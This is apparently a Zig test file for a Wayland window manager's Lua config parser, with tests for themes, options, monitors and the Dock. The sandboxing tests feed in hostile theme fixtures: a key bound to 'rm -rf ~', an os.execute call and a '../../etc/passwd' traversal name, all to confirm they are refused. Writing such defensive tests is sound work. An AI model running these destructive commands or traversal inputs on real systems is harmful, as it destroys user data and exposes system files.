    try std.testing.expectEqual(@as(u32, 2), cfg.parse_warnings);
}

test "a theme runs with an empty environment: it cannot call anything" {
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    var files: FakeFiles = .{
        .paths = &.{ "/cfg/Themes/evil.lua", "/cfg/Themes/evil2.lua" },
        .texts = &.{
            \\gap = 2
            \\bind("Super+Return", "shell rm -rf ~")
            ,
            \\gap = 2
            \\os.execute("touch /tmp/pwned")
        },
    };
    try parseFake(&files, "theme(\"evil\")\ntheme(\"evil2\")\n", &cfg);
    // Both failed (nil is not callable), and a failed theme is dropped as a
    // whole: not even its `gap = 2` applies.
    try std.testing.expectEqual(@as(i32, 8), cfg.gap);
    try std.testing.expectEqual(@as(usize, 0), cfg.binds.len);
    try std.testing.expectEqual(@as(u32, 2), cfg.parse_warnings);
}

test "a theme and the lines around it: later lines win, earlier ones are overridden" {
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    var files: FakeFiles = .{
        .paths = &.{"/cfg/Themes/t.lua"},
        .texts = &.{"gap = 20\nouter_gap = 21\n"},
    };
    try parseFake(&files, "gap = 1\ntheme(\"t\")\nouter_gap = 5\n", &cfg);
    try std.testing.expectEqual(@as(i32, 20), cfg.gap);
    try std.testing.expectEqual(@as(i32, 5), cfg.outer_gap);
    try std.testing.expectEqual(@as(u32, 0), cfg.parse_warnings);
}

test "theme names are file names, never paths" {
    try std.testing.expect(validThemeName("nord"));
    try std.testing.expect(validThemeName("my-theme_2.v1"));
    try std.testing.expect(!validThemeName(""));
    try std.testing.expect(!validThemeName("../etc/passwd"));
    try std.testing.expect(!validThemeName("a/b"));
    try std.testing.expect(!validThemeName(".hidden"));
    try std.testing.expect(!validThemeName("a..b"));
    try std.testing.expect(!validThemeName("with space"));
    try std.testing.expect(!validThemeName("x" ** 65));

    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    var files: FakeFiles = .{ .paths = &.{"/etc/passwd.lua"}, .texts = &.{"gap = 99\n"} };
    try parseFake(&files, "theme(\"../../etc/passwd\")\n", &cfg);
    try std.testing.expectEqual(@as(i32, 8), cfg.gap);
    try std.testing.expectEqual(@as(u32, 1), cfg.parse_warnings);
    try std.testing.expectEqual(@as(usize, 0), files.reads); // refused before any read
}

test "a missing theme is a warning and the defaults stay" {
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    var files: FakeFiles = .{ .paths = &.{}, .texts = &.{} };
    try parseFake(&files, "theme(\"nonexistent\")\n", &cfg);
    try std.testing.expectEqual(@as(i32, 8), cfg.gap);
    try std.testing.expectEqual(@as(u32, 1), cfg.parse_warnings);
}

test "the shipped themes are valid themes and the shipped config has no warnings" {
    const themes = [_]struct { name: []const u8, text: []const u8 }{
        .{ .name = "gruvbox", .text = @embedFile("share/Themes/gruvbox.lua") },
        .{ .name = "nord", .text = @embedFile("share/Themes/nord.lua") },
        .{ .name = "next", .text = @embedFile("share/Themes/next.lua") },
        .{ .name = "graphite", .text = @embedFile("share/Themes/graphite.lua") },
    };
    for (themes) |t| {
        var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
        defer arena.deinit();
        var cfg: Config = .{ .arena = .init(std.testing.allocator) };
        defer cfg.deinit();
        var binds: std.ArrayList(Bind) = .empty;
        try parseWith(arena.allocator(), t.text, &cfg, &binds, t.name, null, true);
        try std.testing.expectEqual(@as(u32, 0), cfg.parse_warnings);
        try std.testing.expect(cfg.border_width >= 1);
    }

    // gruvbox carries the built-in window borders: they must equal the
    // defaults, or the claim in its header is a lie.
    var def: Config = .{ .arena = .init(std.testing.allocator) };
    defer def.deinit();
    var gb: Config = .{ .arena = .init(std.testing.allocator) };
    defer gb.deinit();
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var b1: std.ArrayList(Bind) = .empty;
    try parse(arena.allocator(), default_config_text, &def, &b1, "<built-in>");
    var b2: std.ArrayList(Bind) = .empty;
    try parseWith(arena.allocator(), themes[0].text, &gb, &b2, "gruvbox", null, true);
    try std.testing.expectEqual(def.border_focused, gb.border_focused);
    try std.testing.expectEqual(def.border_unfocused, gb.border_unfocused);
    try std.testing.expectEqual(def.border_floating, gb.border_floating);
    try std.testing.expectEqual(def.border_width, gb.border_width);
    try std.testing.expectEqual(def.gap, gb.gap);
    try std.testing.expectEqual(def.outer_gap, gb.outer_gap);

    // The built-in default config parses without a single warning.
    try std.testing.expectEqual(@as(u32, 0), def.parse_warnings);

    // "next" is the Dock the defaults draw: same colours and fonts.
    var nx: Config = .{ .arena = .init(std.testing.allocator) };
    defer nx.deinit();
    var b3: std.ArrayList(Bind) = .empty;
    try parseWith(arena.allocator(), themes[2].text, &nx, &b3, "next", null, true);
    inline for (.{ "tile_from", "tile_to", "tile_hot_from", "tile_hot_to", "logo_from", "logo_to", "logo_text", "tile_text", "bevel_light", "bevel_dark", "arrow", "arrow_hot" }) |name| {
        try std.testing.expectEqual(@field(def, name), @field(nx, name));
    }
    try std.testing.expectEqualStrings(def.font_dock_logo, nx.font_dock_logo);
    try std.testing.expectEqualStrings(def.font_dock_number, nx.font_dock_number);
}

test "fonts and the focus/wrap/scroll switches are parsed" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    try parseText(arena.allocator(), &cfg,
        \\font_menu_title = "Serif Bold 12"
        \\font_menu = ""
        \\font_dock = "Sans 7"
        \\focus_new_windows = false
        \\workspace_wrap = false
        \\clip_scroll_workspaces = false
    );
    try std.testing.expectEqualStrings("Serif Bold 12", cfg.font_menu_title);
    // An empty font is refused: the default stays.
    try std.testing.expectEqualStrings("Sans 10", cfg.font_menu);
    try std.testing.expectEqualStrings("Sans 7", cfg.font_dock);
    try std.testing.expect(!cfg.focus_new_windows);
    try std.testing.expect(!cfg.workspace_wrap);
    try std.testing.expect(!cfg.clip_scroll_workspaces);
    try std.testing.expectEqual(@as(u32, 1), cfg.parse_warnings);
}

test "pixel options above max_pixels are refused instead of overflowing the layout later" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    try parseText(arena.allocator(), &cfg, "gap = 2000000000\nborder_width = 10001\nouter_gap = 10000\n");
    try std.testing.expectEqual(@as(i32, 8), cfg.gap); // default kept
    try std.testing.expectEqual(@as(i32, 2), cfg.border_width);
    try std.testing.expectEqual(@as(i32, 10_000), cfg.outer_gap); // the limit itself is fine
    try std.testing.expectEqual(@as(u32, 2), cfg.parse_warnings);
}

test "Dock options: the new switches parse, defaults" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    try std.testing.expect(cfg.dock_on_top);
    try std.testing.expect(!cfg.dock_auto_raise);
    try std.testing.expect(!cfg.dock_single_click);
    try std.testing.expect(cfg.dock_save_state);
    try std.testing.expect(!cfg.clip_auto_collapse);
    try std.testing.expect(!cfg.clip_auto_raise);

    try parseText(arena.allocator(), &cfg,
        \\dock_on_top = false
        \\dock_auto_raise = true
        \\dock_single_click = true
        \\dock_save_state = false
        \\clip_auto_collapse = true
        \\clip_auto_raise = true
    );
    try std.testing.expect(!cfg.dock_on_top);
    try std.testing.expect(cfg.dock_auto_raise);
    try std.testing.expect(cfg.dock_single_click);
    try std.testing.expect(!cfg.dock_save_state);
    try std.testing.expect(cfg.clip_auto_collapse);
    try std.testing.expect(cfg.clip_auto_raise);

    // `dock_level` is not a config key (the Dock menu and the saved state
    // carry the level), so it is reported, not taken for an own variable.
    const before = cfg.parse_warnings;
    try parseText(arena.allocator(), &cfg, "dock_level = \"top\"\n");
    try std.testing.expectEqual(before + 1, cfg.parse_warnings);
    try std.testing.expect(!cfg.dock_on_top);
}

test "options config.lua sets itself are explicit; the built-in defaults are not" {
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    var files: FakeFiles = .{ .paths = &.{}, .texts = &.{} };
    try parseFake(&files,
        \\clip_corner = "bottom_right"
        \\dock_edge = "left"
        \\gap = 4
    , &cfg);
    try std.testing.expectEqual(@as(u32, 0), cfg.parse_warnings);
    try std.testing.expectEqual(ClipCorner.bottom_right, cfg.clip_corner);
    try std.testing.expect(cfg.explicit.clip_corner);
    try std.testing.expect(cfg.explicit.dock_edge);
    try std.testing.expect(!cfg.explicit.clip_on_top);
    try std.testing.expect(!cfg.explicit.dock_offset);
}

test "the built-in default config marks no option explicit" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    var binds: std.ArrayList(Bind) = .empty;
    try parse(arena.allocator(), default_config_text, &cfg, &binds, "<built-in>");
    try std.testing.expectEqual(Explicit{}, cfg.explicit);
}

test "layout and workspace options parse, with their defaults" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    // defaults
    try std.testing.expect(cfg.maximize_follow);
    try std.testing.expect(!cfg.maximize_keep_focus);
    try std.testing.expect(cfg.focus_follows_mouse_scroll);
    try std.testing.expect(cfg.prefer_no_csd);
    try std.testing.expect(!cfg.warp_mouse_to_focus);
    try std.testing.expect(!cfg.dynamic_workspaces);
    try std.testing.expectEqual(@as(i32, 0), cfg.strut_left);

    try parseText(arena.allocator(), &cfg,
        \\strut_left = 10
        \\strut_right = 20
        \\strut_top = 30
        \\strut_bottom = 40
        \\center_single_column = true
        \\maximize_follow = false
        \\maximize_keep_focus = true
        \\workspace_back_and_forth = true
        \\dynamic_workspaces = true
        \\focus_follows_mouse_scroll = false
        \\warp_mouse_to_focus = true
        \\prefer_no_csd = false
    );
    try std.testing.expectEqual(@as(u32, 0), cfg.parse_warnings);
    try std.testing.expectEqual(@as(i32, 10), cfg.strut_left);
    try std.testing.expectEqual(@as(i32, 20), cfg.strut_right);
    try std.testing.expectEqual(@as(i32, 30), cfg.strut_top);
    try std.testing.expectEqual(@as(i32, 40), cfg.strut_bottom);
    try std.testing.expect(cfg.center_single_column);
    try std.testing.expect(!cfg.maximize_follow);
    try std.testing.expect(cfg.maximize_keep_focus);
    try std.testing.expect(cfg.workspace_back_and_forth);
    try std.testing.expect(cfg.dynamic_workspaces);
    try std.testing.expect(!cfg.focus_follows_mouse_scroll);
    try std.testing.expect(cfg.warp_mouse_to_focus);
    try std.testing.expect(!cfg.prefer_no_csd);

    // bad values are refused, the old value stays
    try parseText(arena.allocator(), &cfg,
        \\strut_left = -5
        \\strut_top = 99999999
        \\maximize_follow = "yes"
    );
    try std.testing.expectEqual(@as(u32, 3), cfg.parse_warnings);
    try std.testing.expectEqual(@as(i32, 10), cfg.strut_left);
    try std.testing.expectEqual(@as(i32, 30), cfg.strut_top);
}

test "spawn_at_startup takes strings and argv tables" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    try parseText(arena.allocator(), &cfg,
        \\spawn_at_startup = { "waybar", { "mako", "--debug" }, "foot -e \"htop -d 5\"" }
    );
    try std.testing.expectEqual(@as(u32, 0), cfg.parse_warnings);
    try std.testing.expectEqual(@as(usize, 3), cfg.spawn_at_startup.len);
    try std.testing.expectEqualStrings("waybar", cfg.spawn_at_startup[0][0]);
    try std.testing.expectEqual(@as(usize, 2), cfg.spawn_at_startup[1].len);
    try std.testing.expectEqualStrings("htop -d 5", cfg.spawn_at_startup[2][2]);

    // editing the table in place works, like for width_presets
    try parseText(arena.allocator(), &cfg, "table.insert(spawn_at_startup, \"nm-applet\")\n");
    try std.testing.expectEqual(@as(usize, 4), cfg.spawn_at_startup.len);

    // one bad entry refuses the whole option
    try parseText(arena.allocator(), &cfg, "spawn_at_startup = { \"ok\", {} }\n");
    try std.testing.expectEqual(@as(u32, 1), cfg.parse_warnings);
    try std.testing.expectEqual(@as(usize, 4), cfg.spawn_at_startup.len);
}

test "environment takes NAME = \"value\" and refuses anything else" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    try parseText(arena.allocator(), &cfg,
        \\environment = { MOZ_ENABLE_WAYLAND = "1", QT_QPA_PLATFORM = "wayland" }
    );
    try std.testing.expectEqual(@as(u32, 0), cfg.parse_warnings);
    try std.testing.expectEqual(@as(usize, 2), cfg.environment.len);
    var found = false;
    for (cfg.environment) |e| {
        if (std.mem.eql(u8, e.name, "QT_QPA_PLATFORM")) {
            found = true;
            try std.testing.expectEqualStrings("wayland", e.value);
        }
    }
    try std.testing.expect(found);

    // a bad name, a non-string value and a list are all refused; nothing changes
    try parseText(arena.allocator(), &cfg, "environment = { [\"BAD NAME\"] = \"x\" }\n");
    try parseText(arena.allocator(), &cfg, "environment = { GOOD = 5 }\n");
    try parseText(arena.allocator(), &cfg, "environment = { \"a\", \"b\" }\n");
    try std.testing.expectEqual(@as(u32, 3), cfg.parse_warnings);
    try std.testing.expectEqual(@as(usize, 2), cfg.environment.len);

    try std.testing.expect(validEnvName("PATH"));
    try std.testing.expect(validEnvName("_X1"));
    try std.testing.expect(!validEnvName("1X"));
    try std.testing.expect(!validEnvName("A-B"));
    try std.testing.expect(!validEnvName(""));
}

test "--config and --config-dir decide which config.lua is read, --config wins" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    const a = arena.allocator();
    defer {
        config_path_override = null;
        config_dir_override = null;
    }

    config_dir_override = "/some/dir/";
    try std.testing.expectEqualStrings("/some/dir/config.lua", (try userConfigPath(a)).?);
    config_dir_override = "/some/dir";
    try std.testing.expectEqualStrings("/some/dir/config.lua", (try userConfigPath(a)).?);

    config_path_override = "/elsewhere/my.lua";
    try std.testing.expectEqualStrings("/elsewhere/my.lua", (try userConfigPath(a)).?);
}

test "load reads the file --config names" {
    const io = std.testing.io;
    const base = try std.fmt.allocPrint(std.testing.allocator, "/tmp/wmaker-wl-cfgopt-test-{d}", .{std.c.getpid()});
    defer std.testing.allocator.free(base);
    defer std.Io.Dir.cwd().deleteTree(io, base) catch {};
    const path = try std.fmt.allocPrint(std.testing.allocator, "{s}/chosen.lua", .{base});
    defer std.testing.allocator.free(path);
    try std.Io.Dir.cwd().createDirPath(io, base);
    try std.Io.Dir.cwd().writeFile(io, .{ .sub_path = path, .data = "gap = 13\nborder_width = 5\n" });
    defer config_path_override = null;
    config_path_override = path;

    var cfg = try load(io, std.testing.allocator);
    defer cfg.deinit();
    try std.testing.expectEqualStrings(path, cfg.config_file);
    try std.testing.expectEqual(@as(i32, 13), cfg.gap);
    try std.testing.expectEqual(@as(i32, 5), cfg.border_width);
}

test "builtin_text is the shipped default config.lua (what --print-config prints) and means the defaults" {
    try std.testing.expect(builtin_text.len > 100);
    try std.testing.expect(std.mem.indexOf(u8, builtin_text, "bind(") != null);
    const io = std.testing.io;
    const base = try std.fmt.allocPrint(std.testing.allocator, "/tmp/wmaker-wl-printcfg-test-{d}", .{std.c.getpid()});
    defer std.testing.allocator.free(base);
    defer std.Io.Dir.cwd().deleteTree(io, base) catch {};
    const path = try std.fmt.allocPrint(std.testing.allocator, "{s}/config.lua", .{base});
    defer std.testing.allocator.free(path);
    try std.Io.Dir.cwd().createDirPath(io, base);
    try std.Io.Dir.cwd().writeFile(io, .{ .sub_path = path, .data = builtin_text });
    defer config_path_override = null;
    config_path_override = path;

    // `wmaker-wl --print-config > config.lua` gives a config that means the defaults.
    var cfg = try load(io, std.testing.allocator);
    defer cfg.deinit();
    var defaults: Config = .{ .arena = .init(std.testing.allocator) };
    defer defaults.deinit();
    try std.testing.expectEqualStrings(path, cfg.config_file);
    try std.testing.expectEqual(defaults.gap, cfg.gap);
    try std.testing.expectEqual(defaults.border_width, cfg.border_width);
}

// ---- monitor(), monitor_profile() tests -------------------------------------------

test "monitor() and monitor_profile() fill the rule and profile lists" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    try parseText(arena.allocator(), &cfg,
        \\monitor("DP-1", { primary = true, workspaces = 6, start_workspace = 2 })
        \\monitor("eDP-1", { enabled = false, restore_windows = false, on_connect = "notify-send hi", on_disconnect = {"a", "b"} })
        \\monitor_profile{ name = "docked", needs = {"eDP-1", "DP-1"}, exact = true, run = "kanshictl switch docked" }
    );
    try std.testing.expectEqual(@as(u32, 0), cfg.parse_warnings);
    try std.testing.expectEqual(@as(usize, 2), cfg.monitor_rules.items.len);
    const r0 = cfg.monitor_rules.items[0];
    try std.testing.expectEqualStrings("DP-1", r0.match);
    try std.testing.expect(r0.primary and r0.enabled);
    try std.testing.expectEqual(@as(?u32, 6), r0.workspaces);
    try std.testing.expectEqual(@as(?u32, 1), r0.start_workspace);
    const r1 = cfg.monitor_rules.items[1];
    try std.testing.expect(!r1.enabled and !r1.restore_windows);
    try std.testing.expectEqual(@as(usize, 2), r1.on_connect.len);
    try std.testing.expectEqual(@as(usize, 2), r1.on_disconnect.len);
    try std.testing.expectEqual(@as(usize, 1), cfg.monitor_profiles.items.len);
    const p = cfg.monitor_profiles.items[0];
    try std.testing.expectEqualStrings("docked", p.name);
    try std.testing.expect(p.exact);
    try std.testing.expectEqual(@as(usize, 2), p.needs.len);
    try std.testing.expectEqualStrings("DP-1", p.needs[1]);
    try std.testing.expectEqual(@as(usize, 3), p.run.len);
}

test "monitor(): typos and wrong values are warnings and add no rule" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    try parseText(arena.allocator(), &cfg,
        \\monitor("DP-1", { primray = true })
        \\monitor("DP-2", { workspaces = 0 })
        \\monitor("DP-3", { primary = "yes" })
        \\monitor("", { primary = true })
        \\monitor("DP-4")
        \\monitor_profile{ name = "x" }
        \\monitor_profile{ name = "y", needs = {} }
        \\monitor_profile{ name = "z", needs = {1} }
    );
    // A typo warns but the rest of that rule still counts; the others are refused.
    try std.testing.expectEqual(@as(usize, 1), cfg.monitor_rules.items.len);
    try std.testing.expectEqual(@as(usize, 0), cfg.monitor_profiles.items.len);
    try std.testing.expect(cfg.parse_warnings >= 8);
}

test "output_order and monitor_settle_ms are options, bad values are refused" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    try parseText(arena.allocator(), &cfg, "output_order = \"connection\"\nmonitor_settle_ms = 150\n");
    try std.testing.expectEqual(monitors.Order.connection, cfg.output_order);
    try std.testing.expectEqual(@as(u32, 150), cfg.monitor_settle_ms);
    try parseText(arena.allocator(), &cfg, "output_order = \"sideways\"\nmonitor_settle_ms = -5\n");
    try std.testing.expectEqual(monitors.Order.connection, cfg.output_order);
    try std.testing.expectEqual(@as(u32, 150), cfg.monitor_settle_ms);
}

test "a theme can set the Dock colours and fonts, but not anything that acts" {
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    var files: FakeFiles = .{
        .paths = &.{"/cfg/Themes/t.lua"},
        .texts = &.{
            \\tile_from = "#102030"
            \\arrow_hot = 0xff8800
            \\font_dock_logo = "Serif Bold 30"
            \\dock_edge = "left"
        },
    };
    try parseFake(&files, "theme(\"t\")\n", &cfg);
    try std.testing.expectEqual(@as(u32, 0x102030), cfg.tile_from);
    try std.testing.expectEqual(@as(u32, 0xff8800), cfg.arrow_hot);
    try std.testing.expectEqualStrings("Serif Bold 30", cfg.font_dock_logo);
    // dock_edge is behaviour, not look: refused with one warning.
    try std.testing.expectEqual(DockEdge.right, cfg.dock_edge);
    try std.testing.expectEqual(@as(u32, 1), cfg.parse_warnings);
}

test "Dock colours and fonts parse; bad values are refused and change nothing" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    try parseText(arena.allocator(), &cfg,
        \\tile_text = "#ffeedd"
        \\font_dock_number = "Mono 12"
    );
    try std.testing.expectEqual(@as(u32, 0xffeedd), cfg.tile_text);
    try std.testing.expectEqualStrings("Mono 12", cfg.font_dock_number);
    try std.testing.expectEqual(@as(u32, 0), cfg.parse_warnings);

    try parseText(arena.allocator(), &cfg,
        \\tile_text = "nope"
        \\font_dock_number = ""
    );
    try std.testing.expectEqual(@as(u32, 0xffeedd), cfg.tile_text);
    try std.testing.expectEqualStrings("Mono 12", cfg.font_dock_number);
    try std.testing.expectEqual(@as(u32, 2), cfg.parse_warnings);
}

test "the option table is the Config struct: every option has a kind, the rest is not an option" {
    // Names that must be options, one of each kind.
    inline for (.{ "gap", "dock_size", "workspace_count", "width_step", "anim_slowdown", "border_focused", "tile_from", "dock_enabled", "dock_edge", "output_order", "font_dock", "terminal", "width_presets", "bind_layout", "mouse_mod", "environment", "anim_window_open" }) |name| {
        try std.testing.expect(inList(&all_options, name));
    }
    // Fields that are not.
    inline for (not_options) |name| try std.testing.expect(!inList(&all_options, name));
    try std.testing.expect(!inList(&all_options, "binds"));
    try std.testing.expectEqual(Kind.integer, kindOf("workspace_count"));
    try std.testing.expectEqual(Kind.fraction, kindOf("anim_slowdown"));
    try std.testing.expectEqual(Kind.colour, kindOf("arrow"));
    try std.testing.expectEqual(Kind.enumeration, kindOf("output_order"));
    try std.testing.expectEqual(Kind.font, kindOf("font_menu"));
    try std.testing.expectEqual(Kind.command, kindOf("browser"));
    try std.testing.expectEqual(Kind.special, kindOf("workspace_names"));
}

test "themes accept look options only" {
    try std.testing.expect(themeKey("gap"));
    try std.testing.expect(themeKey("border_width"));
    try std.testing.expect(themeKey("tile_from"));
    try std.testing.expect(themeKey("font_dock"));
    try std.testing.expect(!themeKey("workspace_count"));
    try std.testing.expect(!themeKey("dock_edge"));
    try std.testing.expect(!themeKey("terminal"));
    try std.testing.expect(!themeKey("min_window_size"));
    try std.testing.expect(!themeKey("not_an_option"));
}

test "integer and fraction bounds follow the option" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    try parseText(arena.allocator(), &cfg,
        \\anim_slowdown = 500
        \\workspace_count = 16
        \\dock_size = 256
        \\monitor_settle_ms = 10000
    );
    try std.testing.expectEqual(@as(u32, 0), cfg.parse_warnings);
    try parseText(arena.allocator(), &cfg,
        \\anim_slowdown = 1001
        \\default_column_width = 1.5
        \\workspace_count = 17
        \\dock_size = 15
        \\gap = -1
    );
    try std.testing.expectEqual(@as(u32, 5), cfg.parse_warnings);
    try std.testing.expectEqual(@as(f64, 500), cfg.anim_slowdown);
    try std.testing.expectEqual(@as(i32, 8), cfg.gap);
}
